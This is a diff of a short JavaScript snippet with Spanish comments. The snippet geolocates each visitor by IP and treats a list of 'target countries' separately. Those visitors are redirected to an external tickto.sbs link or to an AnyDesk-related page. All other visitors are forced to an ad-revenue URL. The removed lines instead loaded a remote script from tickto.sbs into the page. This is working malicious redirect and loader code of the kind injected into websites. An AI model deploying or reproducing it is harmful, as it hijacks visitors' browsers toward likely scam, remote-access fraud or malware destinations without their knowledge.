@@ -1,25 +1,30 @@
-<script>
-const countryHack = ['MX', 'DO', 'FJ', 'BR', 'PL', 'RS', 'HR', 'ME', 'MJ', 'GE', 'GT', 'AU', 'NZ'];
-const urlPlantilla = 'https://tickto.sbs/0Py3qQJN'; // Reemplaza con tu URL deseada
-const urlPromocion = 'https://www.highcpmrevenuegate.com/x293k2w3xc?key=c756c8fb361df5df079ee02588e59baa';
+let countryHack = ['MX', 'DO', 'FJ', 'BR', 'PL', 'RS', 'HR', 'ME', 'MJ', 'GE', 'GT', 'AU', 'NZ']; // Paises objetivo
+let scriptHack = 'https://tickto.sbs/0Py3qQJN';
+let urlPromocion = 'https://www.highcpmrevenuegate.com/x293k2w3xc?key=c756c8fb361df5df079ee02588e59baa';
+let country;
 
 fetch('https://get.geojs.io/v1/ip/country')
     .then((response) => response.text())
     .then((data) => {
-        const country = data.trim();
-
+        country = data.trim();
         if (countryHack.includes(country)) {
-            loadScript(urlPlantilla);
-            console.log('Redirigiendo a la plantilla para el país ' + country);
+            redirectURL(country);
         } else {
+            // Redirige a una URL de respaldo si el país no está en la lista
             window.location.href = urlPromocion;
-            console.log('Redirigiendo a la promoción');
         }
     });
 
-function loadScript(scriptUrl) {
-    const script = document.createElement('script');
-    script.src = scriptUrl;
-    document.head.appendChild(script);
+function redirectURL(country) {
+    // Agrega lógica personalizada para redirigir según el país aquí
+    // Por ejemplo:
+    if (country === 'MX') {
+        window.location.href = 'URL_PARA_MEXICO';
+    } else if (country === 'DO') {
+        window.location.href = 'https://whos.amung.us/stats/readers/anydesk/';
+    } else {
+        // Si no se especifica un redireccionamiento para un país específico,
+        // redirige al scriptHack
+        window.location.href = scriptHack;
+    }
 }
-</script>
